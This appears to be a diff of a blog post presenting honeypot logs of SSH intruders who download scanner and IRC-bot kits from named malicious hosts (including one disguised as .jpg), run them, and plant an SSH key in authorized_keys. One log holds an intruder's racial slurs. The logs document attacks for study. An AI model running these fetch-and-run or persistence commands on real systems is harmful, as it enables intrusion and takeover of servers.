+    .kde/gen-pass.sh
+    .kde/start
+    .kde/vuln.txt
+    server:/tmp/.user# cs .kde
+    bash: cs: command not found
+    server:/tmp/.user# cd .kde
+    server:/tmp/.user/.kde# ls -a
+    .           ..          pass_filees pscan2      a1          common    <br />
+    pass_file   ssh-scan    auto        ss          go.sh       a         <br />
+    gen-pass.sh start       vuln.txt  <br />
+    server:/tmp/.user/.kde# chmod +x <em>
+    server:/tmp/.user/.kde# ./a 210.133
+    unable to open display &#8220;:0&#8221;
+    server:/tmp/.user/.kde# chmod +x </em>
+    server:/tmp/.user/.kde# ./start 28
+    error while loading shared libraries: libgnome.so.32: cannot open shared object file: No such file or directory
+    server:/tmp/.user/.kde# cd ..
+    server:/tmp/.user# ls-a
+    bash: ls-a: command not found
+    server:/tmp/.user# ls -a
+    .        ..       .kde.tgz .kde     .kde   <br />
+    server:/tmp/.user# wget bila.do.am/bila.tgz
+    &#8212;2011-01-26 23:50:26&#8212;  http://bila.do.am/bila.tgz
+    Connecting to bila.do.am:80&#8230; connected.
+    <span class="caps">HTTP</span> request sent, awaiting response&#8230; 200 <span class="caps">OK</span>
+    Length: 262027 (255K) [application/octet-stream]
+    Saving to: <code>bila.tgz
+    100%[======================================&gt;] 262,027      6K/s  eta 42s
+    2011-01-26 23:50:27 (6 KB/s) -</code>bila.tgz&#8217; saved [262027/262027]
+    server:/tmp/.user# tar zxvf bila.tgz
+    .tmp
+    .tmp/cyc.acc
+    .tmp/ -bash
+    .tmp/s.sh
+    .tmp/cyc.set
+    .tmp/pico
+    .tmp/stealth
+    server:/tmp/.user# ls -a
+    .        ..       .kde.tgz .kde     .kde     bila.tgz .tmp   <br />
+    server:/tmp/.user# cd .tmp
+    server:/tmp/.user/.tmp# ls -a
+    .       ..      cyc.acc  -bash  s.sh    cyc.set pico    stealth 
+    server:/tmp/.user/.tmp# ./stealth
+    unable to open display&nbsp;&#8220;:0&#8221;</p>
+<h2>Fifth&nbsp;example</h2>
+<p>Another straightforward attempt. Also here, the website http://arhiva.do.am seems to be used as a dump for hosting malware.
+    server:~# wget http://arhiva.do.am/dabian.tgz
+    &#8212;2011-01-27 00:18:22&#8212;  http://arhiva.do.am/dabian.tgz
+    Connecting to arhiva.do.am:80&#8230; connected.
+    <span class="caps">HTTP</span> request sent, awaiting response&#8230; 404 Not Found
+    server:~# wget http://arhiva.do.am/arhiva.tgz
+    &#8212;2011-01-27 00:18:57&#8212;  http://arhiva.do.am/arhiva.tgz
+    Connecting to arhiva.do.am:80&#8230; connected.
+    <span class="caps">HTTP</span> request sent, awaiting response&#8230; 404 Not Found
+    server:~# wget http://arhiva.do.am/scan.tar
+    &#8212;2011-01-27 00:19:28&#8212;  http://arhiva.do.am/scan.tar
+    Connecting to arhiva.do.am:80&#8230; connected.
+    <span class="caps">HTTP</span> request sent, awaiting response&#8230; 200 <span class="caps">OK</span>
+    Length: 1484800 (1M) [application/octet-stream]
+    Saving to: <code>scan.tar
+    100%[======================================&gt;] 1,484,800    518K/s  eta 0s  
+    2011-01-27 00:19:31 (518 KB/s) -</code>scan.tar&#8217; saved [1484800/1484800]
+    server:~# tar xvf scan.tar
+    scan
+    scan/sshf
+    scan/a6
+    scan/start
+    scan/pass_sh
+    scan/a5
+    scan/gen-pass.sh
+    scan/ssh-scan
+    scan/test.sh
+    scan/<span class="caps">README</span>
+    scan/200.pscan.22
+    scan/pass_file
+    scan/sshf0
+    scan/pscan2
+    scan/pico
+    scan/pass_filees
+    scan/vuln.txt
+    scan/a4
+    scan/a1
+    scan/a2
+    scan/mfu.txt
+    scan/a
+    scan/common
+    server:~# rm -rf scan.tar
+    server:~# ls -a
+    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   scan    <br />
+    server:~# cd scan
+    server:/root/scan# ./a 64.189
+    Shall we play a&nbsp;game?</p>
+<h2>Sixth&nbsp;example</h2>
+<p>Another attempt. Here, three different malware programs are tried out before giving up. It&#8217;s also interesting to see where intruders hide their downloads, some use <code>/root</code>, some <code>/tmp</code>, some esoteric locations like <code>/tmp/...</code>.
+    server:~# wget
+    wget: missing <span class="caps">URL</span>
+    Usage: wget [<span class="caps">OPTION</span>]&#8230; [<span class="caps">URL</span>]&#8230;
+    Try <code>wget --help' for more options.
+    server:~# yum
+    bash: yum: command not found
+    server:~# wget freewebtown.com/pacalici/lib.tgz
+    --2011-02-09 00:30:57--  http://freewebtown.com/pacalici/lib.tgz
+    Connecting to freewebtown.com:80... connected.
+    HTTP request sent, awaiting response... 200 OK
+    Length: 8772939 (8M) [application/x-tar]
+    Saving to:</code>lib.tgz
+    100%[======================================&gt;] 8,772,939    1844K/s  eta&nbsp;0s  </p>
+<div class="highlight"><pre>2011-02-09 00:31:02 (1844 KB/s) - `lib.tgz&#39; saved [8772939/8772939]
+server:~# tar zxvf lib.tgz
+lib
+lib/mech.pid
+lib/fuck
+lib/j2
+lib/v
+lib/s
+lib/r
+lib/__libc_start_main
+lib/std
+lib/b
+lib/bang.txt
+lib/j
+lib/1
+lib/f4
+lib/dir
+lib/y2kupdate
+lib/fwd
+lib/x
+lib/mech.set
+lib/tty
+lib/cron.d
+lib/h
+lib/sl
+lib/b2
+lib/W2Ksp3.exe
+lib/tun.seen
+lib/f
+lib/h.c
+lib/stream
+lib/v2
+lib/init
+
+server:~# rm -rf lib.tgz
+server:~# cd lib
+server:/root/lib# ./y2kupdate
+unable to open display &quot;:0&quot;
+server:/root/lib# ./init
+unable to open display &quot;:0&quot;
+server:/root/lib# cd
+server:~# ls
+lib 
+server:~# cd /dev
+server:/dev# wget freewebtown.com/pacalici/bf.tgz
+--2011-02-09 00:32:05--  http://freewebtown.com/pacalici/bf.tgz
+Connecting to freewebtown.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 392378 (383K) [application/x-tar]
+Saving to: `bf.tgz
+100%[======================================&gt;] 392,378      9K/s  eta 39s
+2011-02-09 00:32:06 (9 KB/s) - `bf.tgz&#39; saved [392378/392378]
+server:/dev# tar zxvf bf.tgz
+mc-root
+mc-root/go
+mc-root/cyc.set
+mc-root/cyc.help
+mc-root/cyc.levels
+mc-root/bash
+mc-root/udp.pl
+mc-root/stealth
+mc-root/randfiles
+mc-root/randfiles/randkicks.e
+mc-root/randfiles/randaway.e
+mc-root/randfiles/randsignoff.e
+mc-root/randfiles/randinsult.e
+mc-root/randfiles/randversions.e
+mc-root/randfiles/randsay.e
+mc-root/randfiles/randpickup.e
+mc-root/randfiles/randnicks.e
+mc-root/cyc.acc
+mc-root/pico.tgz
+mc-root/pico
+mc-root/cyc.pid
+server:/dev# rm -rf bf.tgz
+server:/dev# 
+server:/dev# cd mc-root
+server:/dev/mc-root# ./go
+unable to open display &quot;:0&quot;
+server:/dev/mc-root# ls
+go         cyc.set    cyc.help   cyc.levels bash       udp.pl     stealth    
+randfiles  cyc.acc    pico.tgz   pico       cyc.pid    
+server:/dev/mc-root# cd
+server:~# 
+server:~# 
+server:~# wget pibo.com/.x/scan/wtf.tar
+--2011-02-09 00:35:09--  http://pibo.com/.x/scan/wtf.tar
+Connecting to pibo.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1574103 (1M) [application/x-tar]
+Saving to: `wtf.tar
+100%[======================================&gt;] 1,574,103    299K/s  eta 1s   
+2011-02-09 00:35:13 (299 KB/s) - `wtf.tar&#39; saved [1574103/1574103]
+server:~# tar xzvf wtf.tar
+wtf
+wtf/a
+wtf/a1
+wtf/auto
+wtf/common
+wtf/gen-pass.sh
+wtf/go.sh
+wtf/pass_file
+wtf/pscan2
+wtf/scam
+wtf/sh
+wtf/ss
+wtf/ssh-scan
+wtf/start
+wtf/vuln.txt
+
+server:~# cd wtf
+
+server:/root/wtf# chmod +x *
+server:/root/wtf# ./a 100
+error while loading shared libraries: libgnome.so.32: cannot open shared object file: No such file or directory
+server:/root/wtf#
+</pre></div>
+
+
+<h2>Seventh&nbsp;example</h2>
+<p>Not only is this intruder very offensive, he also quickly spotted the honeypot.
+    server:~# adduser nigger
+    Adding user <code>nigger' ...
+    Adding new group</code>nigger&#8217; (1001) &#8230;
+    Adding new user <code>nigger' (1001) with group</code>nigger&#8217; &#8230;
+    Creating home directory <code>/home/nigger' ...
+    Copying files from</code>/etc/skel&#8217; &#8230;
+    Password: 
+    Password again: 
+    Changing the user information for nigger
+    Enter the new value, or press <span class="caps">ENTER</span> for the default
+            Username []: 
+    Must enter a value!
+            Username []: only
+            Full Name []: dumb
+            Room Number []: niggers
+            Work Phone []: use
+            Home Phone []: honeypot
+            Mobile Phone []: you
+            Country []: stupid
+            City []: nigger
+            Language []: <span class="caps">HA</span>
+            Favorite movie []: <span class="caps">HA</span>
+            Other []: <span class="caps">HA</span>
+    Is the information correct? [Y/n] y
+    <span class="caps">ERROR</span>: Some of the information you entered is invalid
+    Deleting user <code>nigger' ...
+    Deleting group</code>nigger&#8217; (1001) &#8230;
+    Deleting home directory `/home/nigger&#8217; &#8230;
+    Try again? [Y/n]&nbsp;n</p>
+<h2>Eight&nbsp;example</h2>
+<p>This guy tried adding his <span class="caps">SSH</span> keys and installing software again and again and was one of the most persistent intruders.
+    server:~# cd
+    server:~# ls -a
+    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc <br />
+    server:~# cd /root
+    server:~# ls -a
+    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc <br />
+    server:~# cd ..
+    server:/# ls -a
+    .          ..         sys        bin        mnt        media      vmlinuz  <br />
+    opt        cdrom      selinux    tmp        proc       sbin       etc      <br />
+    dev        srv        initrd.img lib        home       var        usr      <br />
+    boot       root       lost+found 
+    server:/# cd
+    server:~# ls -a
+    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc <br />
+    server:~# mkdir .ssh
+    server:~# cd .ssh
+    server:/root/.ssh# ls -a
+    server:/root/.ssh# echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH+iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed/FONEcnZFVo0eTkaZ+xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf+I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ== rsa-key-20080201 &gt;&gt; ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys
+    ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH+iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed/FONEcnZFVo0eTkaZ+xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf+I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ== rsa-key-20080201 &gt;&gt; ~/.ssh/authorized_keys
+    server:/root/.ssh# ls  -a
+    server:/root/.ssh# dir
+    bash: dir: command not found
+    server:/root/.ssh# ls -a
+    server:/root/.ssh# cd ..
+    server:~# ls -a
+    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   .ssh    <br />
+    server:~# rm -rf .ssh
+    server:~# cd .root
+    bash: cd: .root: No such file or directory
+    server:~# cd /root
+    server:~# ls -a
+    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc <br />
+    server:~# mkdir .ssh
+    server:~# cd .ssh
+    server:/root/.ssh# echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH+iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed/FONEcnZFVo0eTkaZ+xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf+I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ== rsa-key-20080201 &gt;&gt; ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys
+    ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH+iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed/FONEcnZFVo0eTkaZ+xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf+I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ== rsa-key-20080201 &gt;&gt; ~/.ssh/authorized_keys
+    server:/root/.ssh# cd ..
+    server:~# ls -a
+    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   .ssh    <br />
+    server:~# rm -rf .ssh
+    server:~# cd ..
+    server:/# ls -a
+    .          ..         sys        bin        mnt        media      vmlinuz  <br />
+    opt        cdrom      selinux    tmp        proc       sbin       etc      <br />
+    dev        srv        initrd.img lib        home       var        usr      <br />
+    boot       root       lost+found 
+    server:/# cd home
+    server:/home# ls -a
+    .       ..      richard 
+    server:/home# cd ..
+    server:/# ls -a
+    .          ..         sys        bin        mnt        media      vmlinuz  <br />
+    opt        cdrom      selinux    tmp        proc       sbin       etc      <br />
+    dev        srv        initrd.img lib        home       var        usr      <br />
+    boot       root       lost+found 
+    server:/# mkdir .ssh
+    server:/# cd .ssh
+    server:/.ssh# echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH+iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed/FONEcnZFVo0eTkaZ+xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf+I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ== rsa-key-20080201 &gt;&gt; ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys
+    ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH+iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed/FONEcnZFVo0eTkaZ+xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf+I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ== rsa-key-20080201 &gt;&gt; ~/.ssh/authorized_keys
+    server:/.ssh# cd ..
+    server:/# ;s =a
+    bash: s: command not found
+    server:/# 
+    server:/# ls -a
+    .          ..         sys        bin        mnt        media      vmlinuz  <br />
+    opt        cdrom      selinux    tmp        proc       sbin       etc      <br />
+    dev        srv        initrd.img lib        home       var        usr      <br />
+    boot       root       lost+found .ssh     <br />
+    server:/# rm -rf .ssh
+    server:/# cd
+    server:~# cd /tmp
+    server:/tmp# ls -a
+    .         ..        .<span class="caps">ICE</span>-unix .X11-unix 
+    server:/tmp# mkdir ,
+    server:/tmp# cd ,
+    server:/tmp/,# wget http://pinky.clan.su/mech/fast.jpg ;  tar fast.jpg
+    &#8212;2011-03-02 21:07:41&#8212;  http://pinky.clan.su/mech/fast.jpg
+    Connecting to pinky.clan.su:80&#8230; connected.
+    <span class="caps">HTTP</span> request sent, awaiting response&#8230; 200 <span class="caps">OK</span>
+    Length: 821334 (802K) [image/jpeg]
+    Saving to: <code>fast.jpg
+    100%[======================================&gt;] 821,334      113K/s  eta 0s  
+    2011-03-02 21:07:49 (113 KB/s) -</code>fast.jpg&#8217; saved [821334/821334]
+    tar: You must specify one of the <code>-Acdtrux' options
+    Try</code>tar &#8212;help&#8217; or `tar &#8212;usage&#8217; for more information.
+    server:/tmp/,# tar zxvf fast.jpg
+    fast
+    fast/src
+    fast/src/xmech.o
+    fast/src/xmech.c
+    fast/src/vars.o
+    fast/src/vars.c
+    fast/src/userlist.o
+    fast/src/userlist.c
+    fast/src/usage.h
+    fast/src/text.h
+    fast/src/structs.h
+    fast/src/socket.o
+    fast/src/socket.c
+    fast/src/parse.o
+    fast/src/parse.c
+    fast/src/mcmd.h
+    fast/src/Makefile.in
+    fast/src/Makefile
+    fast/src/main.o
+    fast/src/main.c
+    fast/src/link.o
+    fast/src/link.c
+    fast/src/h.h
+    fast/src/global.h
+    fast/src/gencmd.c
+    fast/src/gencmd
+    fast/src/function.o
+    fast/src/function.c
+    fast/src/defines.h
+    fast/src/debug.o
+    fast/src/debug.c
+    fast/src/dcc.o
+    fast/src/dcc.c
+    fast/src/config.h.in
+    fast/src/config.h
+    fast/src/commands.o
+    fast/src/commands.c
+    fast/src/combot.o
+    fast/src/combot.c
+    fast/src/com-ons.o
+    fast/src/com-ons.c
+    fast/src/channel.o
+    fast/src/channel.c
+    fast/src/cfgfile.o
+    fast/src/cfgfile.c
+    fast/r
+    fast/r/rversions.e
+    fast/r/rtsay.e
+    fast/r/rsignoff.e
+    fast/r/rsay.e
+    fast/r/rpickup.e
+    fast/r/rnicks.e
+    fast/r/rkicks.e
+    fast/r/rinsult.e
+    fast/r/raway.e
+    fast/mkindex
+    fast/Makefile
+    fast/m.set
+    fast/m.help
+    fast/LinkEvents
+    fast/go
+    fast/genuser
+    fast/configure
+    fast/checkmech
+    fast/bash
+    fast/3.user
+    fast/2.user
+    fast/1.user&nbsp;fast/configure.c</p>
+<div class="highlight"><pre><span class="nt">server</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/,</span><span class="err">#</span> <span class="nt">cd</span> <span class="nt">fast</span>
+<span class="nt">server</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/,/</span><span class="nt">fast</span><span class="err">#</span> <span class="nt">ls</span> <span class="nt">-a</span>
+<span class="o">.</span>           <span class="o">..</span>          <span class="nt">src</span>         <span class="nt">r</span>           <span class="nt">mkindex</span>     <span class="nt">Makefile</span>    
+<span class="nt">m</span><span class="nc">.set</span>       <span class="nt">m</span><span class="nc">.help</span>      <span class="nt">LinkEvents</span>  <span class="nt">go</span>          <span class="nt">genuser</span>     <span class="nt">configure</span>   
+<span class="nt">checkmech</span>   <span class="nt">bash</span>        <span class="nt">3</span><span class="nc">.user</span>      <span class="nt">2</span><span class="nc">.user</span>      <span class="nt">1</span><span class="nc">.user</span>      <span class="nt">configure</span><span class="nc">.c</span> 
+<span class="nt">server</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/,/</span><span class="nt">fast</span><span class="err">#</span> <span class="nt">vi</span> <span class="nt">1</span><span class="nc">.user</span>
+<span class="nt">E558</span><span class="o">:</span> <span class="nt">Terminal</span> <span class="nt">entry</span> <span class="nt">not</span> <span class="nt">found</span> <span class="nt">in</span> <span class="nt">terminfo</span>
+<span class="nt">server</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/,/</span><span class="nt">fast</span><span class="err">#</span> <span class="nt">pico</span> <span class="nt">1</span><span class="nc">.user</span>
+<span class="nt">bash</span><span class="o">:</span> <span class="nt">pico</span><span class="o">:</span> <span class="nt">command</span> <span class="nt">not</span> <span class="nt">found</span>
+<span class="nt">server</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/,/</span><span class="nt">fast</span><span class="err">#</span> <span class="nt">apt-get</span>  <span class="nt">install</span> <span class="nt">pico</span>
+<span class="nt">Reading</span> <span class="nt">package</span> <span class="nt">lists</span><span class="o">...</span> <span class="nt">Done</span>
+<span class="nt">Building</span> <span class="nt">dependency</span> <span class="nt">tree</span>
+<span class="nt">Reading</span> <span class="nt">state</span> <span class="nt">information</span><span class="o">...</span> <span class="nt">Done</span>
+<span class="nt">The</span> <span class="nt">following</span> <span class="nt">NEW</span> <span class="nt">packages</span> <span class="nt">will</span> <span class="nt">be</span> <span class="nt">installed</span><span class="o">:</span>
+  <span class="nt">pico</span> 
+<span class="nt">0</span> <span class="nt">upgraded</span><span class="o">,</span> <span class="nt">1</span> <span class="nt">newly</span> <span class="nt">installed</span><span class="o">,</span> <span class="nt">0</span> <span class="nt">to</span> <span class="nt">remove</span> <span class="nt">and</span> <span class="nt">259</span> <span class="nt">not</span> <span class="nt">upgraded</span><span class="o">.</span>
+<span class="nt">Need</span> <span class="nt">to</span> <span class="nt">get</span> <span class="nt">158</span><span class="nc">.2kB</span> <span class="nt">of</span> <span class="nt">archives</span><span class="o">.</span>
+<span class="nt">After</span> <span class="nt">this</span> <span class="nt">operation</span><span class="o">,</span> <span class="nt">347</span><span class="nc">.6kB</span> <span class="nt">of</span> <span class="nt">additional</span> <span class="nt">disk</span> <span class="nt">space</span> <span class="nt">will</span> <span class="nt">be</span> <span class="nt">used</span><span class="o">.</span>
+<span class="nt">Get</span><span class="nd">:1</span> <span class="nt">http</span><span class="o">://</span><span class="nt">ftp</span><span class="nc">.debian.org</span> <span class="nt">stable</span><span class="o">/</span><span class="nt">main</span> <span class="nt">pico</span> <span class="nt">1</span><span class="nc">.15-7</span> <span class="cp">[</span><span class="mf">158.2</span><span class="nx">kB</span><span class="cp">]</span>
+<span class="nt">Fetched</span> <span class="nt">158</span><span class="nc">.2kB</span> <span class="nt">in</span> <span class="nt">1s</span> <span class="o">(</span><span class="nt">4493B</span><span class="o">/</span><span class="nt">s</span><span class="o">)</span>
+<span class="nt">Reading</span> <span class="nt">package</span> <span class="nt">fields</span><span class="o">...</span> <span class="nt">Done</span>
+<span class="nt">Reading</span> <span class="nt">package</span> <span class="nt">status</span><span class="o">...</span> <span class="nt">Done</span>
+<span class="o">(</span><span class="nt">Reading</span> <span class="nt">database</span> <span class="o">...</span> <span class="nt">177887</span> <span class="nt">files</span> <span class="nt">and</span> <span class="nt">directories</span> <span class="nt">currently</span> <span class="nt">installed</span><span class="o">.)</span>
+<span class="nt">Unpacking</span> <span class="nt">pico</span> <span class="o">(</span><span class="nt">from</span> <span class="o">.../</span><span class="nt">archives</span><span class="o">/</span><span class="nt">pico_1</span><span class="nc">.15-7_i386.deb</span><span class="o">)</span> <span class="o">...</span>
+<span class="nt">Processing</span> <span class="nt">triggers</span> <span class="nt">for</span> <span class="nt">man-db</span> <span class="o">...</span>
+<span class="nt">Setting</span> <span class="nt">up</span> <span class="nt">pico</span> <span class="o">(</span><span class="nt">1</span><span class="nc">.15-7</span><span class="o">)</span> <span class="o">...</span>
+
+<span class="nt">server</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/,/</span><span class="nt">fast</span><span class="err">#</span> <span class="nt">pico</span> <span class="nt">1</span><span class="nc">.user</span>
+<span class="nt">pico</span><span class="o">:</span> <span class="nt">Segmentation</span> <span class="nt">fault</span>
+<span class="nt">server</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/,/</span><span class="nt">fast</span><span class="err">#</span> <span class="o">./</span><span class="nt">pico</span> <span class="nt">1</span><span class="nc">.user</span>
+<span class="nt">bash</span><span class="o">:</span> <span class="o">./</span><span class="nt">pico</span><span class="o">:</span> <span class="nt">command</span> <span class="nt">not</span> <span class="nt">found</span>
+<span class="nt">server</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/,/</span><span class="nt">fast</span><span class="err">#</span> <span class="nt">wget</span> <span class="nt">pinky</span><span class="nc">.clan.su</span><span class="o">/</span><span class="nt">altele</span><span class="o">/</span><span class="nt">pico</span><span class="nc">.jpg</span>
+<span class="nt">--2011-03-02</span> <span class="nt">21</span><span class="nd">:09:32--</span>  <span class="nt">http</span><span class="o">://</span><span class="nt">pinky</span><span class="nc">.clan.su</span><span class="o">/</span><span class="nt">altele</span><span class="o">/</span><span class="nt">pico</span><span class="nc">.jpg</span>
+<span class="nt">Connecting</span> <span class="nt">to</span> <span class="nt">pinky</span><span class="nc">.clan.su</span><span class="nd">:80</span><span class="o">...</span> <span class="nt">connected</span><span class="o">.</span>
+<span class="nt">HTTP</span> <span class="nt">request</span> <span class="nt">sent</span><span class="o">,</span> <span class="nt">awaiting</span> <span class="nt">response</span><span class="o">...</span> <span class="nt">200</span> <span class="nt">OK</span>
+<span class="nt">Length</span><span class="o">:</span> <span class="nt">84478</span> <span class="o">(</span><span class="nt">82K</span><span class="o">)</span> <span class="cp">[</span><span class="nb">image</span><span class="p">/</span><span class="nx">jpeg</span><span class="cp">]</span>
+<span class="nt">Saving</span> <span class="nt">to</span><span class="o">:</span> <span class="err">`</span><span class="nt">pico</span><span class="nc">.jpg</span>
+<span class="nt">100</span><span class="o">%</span><span class="cp">[</span><span class="o">======================================&gt;</span><span class="cp">]</span> <span class="nt">84</span><span class="o">,</span><span class="nt">478</span>       <span class="nt">27K</span><span class="o">/</span><span class="nt">s</span>  <span class="nt">eta</span> <span class="nt">1s</span>
+<span class="nt">2011-03-02</span> <span class="nt">21</span><span class="nd">:09:34</span> <span class="o">(</span><span class="nt">27</span> <span class="nt">KB</span><span class="o">/</span><span class="nt">s</span><span class="o">)</span> <span class="nt">-</span> <span class="err">`</span><span class="nt">pico</span><span class="nc">.jpg</span><span class="s1">&#39; saved </span><span class="cp">[</span><span class="mi">84478</span><span class="p">/</span><span class="nx">84478</span><span class="cp">]</span><span class="s1"></span>
+<span class="s1">server:/tmp/,/fast# tar zxvf pico.jpg</span>
+<span class="s1">pico</span>
+
+<span class="s1">server:/tmp/,/fast# ./pico 1.user</span>
+<span class="s1">Shall we play a game? </span>
+<span class="s1">A strange game. The only winning move is not to play.  How about a nice game of chess?</span>
+<span class="s1">server:/tmp/,/fast# ./pico 1.user</span>
+<span class="s1">Shall we play a game? y</span>
+<span class="s1">A strange game. The only winning move is not to play.  How about a nice game of chess?</span>
+<span class="s1">server:/tmp/,/fast# </span>
+<span class="s1">server:/tmp/,/fast# ls -a</span>
+<span class="s1">.           ..          src         r           mkindex     Makefile    </span>
+<span class="s1">m.set       m.help      LinkEvents  go          genuser     configure   </span>
+<span class="s1">checkmech   bash        3.user      2.user      1.user      configure.c </span>
+<span class="s1">pico.jpg    pico        </span>
+<span class="s1">server:/tmp/,/fast# apt-get install vi</span>
+<span class="s1">Reading package lists... Done</span>
+<span class="s1">Building dependency tree</span>
+<span class="s1">Reading state information... Done</span>
+<span class="s1">The following NEW packages will be installed:</span>
+<span class="s1">  vi </span>
+<span class="s1">0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.</span>
+<span class="s1">Need to get 442.2kB of archives.</span>
+<span class="s1">After this operation, 972.4kB of additional disk space will be used.</span>
+<span class="s1">Get:1 http://ftp.debian.org stable/main vi 0.12-1 </span><span class="cp">[</span><span class="mf">442.2</span><span class="nx">kB</span><span class="cp">]</span><span class="s1"></span>
+<span class="s1">Fetched 442.2kB in 1s (4493B/s)</span>
+<span class="s1">Reading package fields... Done</span>
+<span class="s1">Reading package status... Done</span>
+<span class="s1">(Reading database ... 177887 files and directories currently installed.)</span>
+<span class="s1">Unpacking vi (from .../archives/vi_0.12-1_i386.deb) ...</span>
+<span class="s1">Processing triggers for man-db ...</span>
+<span class="s1">Setting up vi (0.12-1) ...</span>
+<span class="s1">server:/tmp/,/fast# vi 1.user</span>
+<span class="s1">E558: Terminal entry not found in terminfo</span>
+<span class="s1">server:/tmp/,/fast# </span>
+<span class="s1">server:/tmp/,/fast# wget http://root-arhive.do.am/scanner/goshNEW.jpg  ; tar zxvf goshNEW.jpg ; cd goshNEW ; chmod +x *</span>
+<span class="s1">server:/tmp/,/fast# cd ..</span>
+<span class="s1">server:/tmp/,# ls -a</span>
+<span class="s1">.        ..       fast.jpg fast     </span>
+<span class="s1">server:/tmp/,# wget http://root-arhive.do.am/scanner/goshNEW.jpg  ; tar zxvf goshNEW.jpg ; cd goshNEW ; chmod +x *</span>
+<span class="s1">--2011-03-02 21:11:59--  http://root-arhive.do.am/scanner/goshNEW.jpg</span>
+<span class="s1">Connecting to root-arhive.do.am:80... connected.</span>
+<span class="s1">HTTP request sent, awaiting response... 200 OK</span>
+<span class="s1">Length: 3144067 (2M) </span><span class="cp">[</span><span class="nb">image</span><span class="p">/</span><span class="nx">jpeg</span><span class="cp">]</span><span class="s1"></span>
+<span class="s1">Saving to: `goshNEW.jpg</span>
+<span class="s1">100%</span><span class="cp">[</span><span class="o">======================================&gt;</span><span class="cp">]</span><span class="s1"> 3,144,067    759K/s  eta 0s</span>
+
+<span class="s1">2011-03-02 21:12:03 (759 KB/s) - `goshNEW.jpg&#39;</span> <span class="nt">saved</span> <span class="cp">[</span><span class="mi">3144067</span><span class="p">/</span><span class="nx">3144067</span><span class="cp">]</span>
+<span class="nt">goshNEW</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">a</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">userrootmic</span><span class="nc">.txt</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">gen-pass</span><span class="nc">.h</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">mass</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">2</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">ss</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">pscan2</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">secure</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">ssh-scan</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">sortateusr</span><span class="nc">.txt</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">CITESTE-INAINTE-SA-INCEPI</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">vuln</span><span class="nc">.txt</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">common</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">1</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">gen-pass</span><span class="nc">.sh</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">go</span><span class="nc">.shB</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">pass_file</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">5</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">userroomare</span><span class="nc">.txt</span>
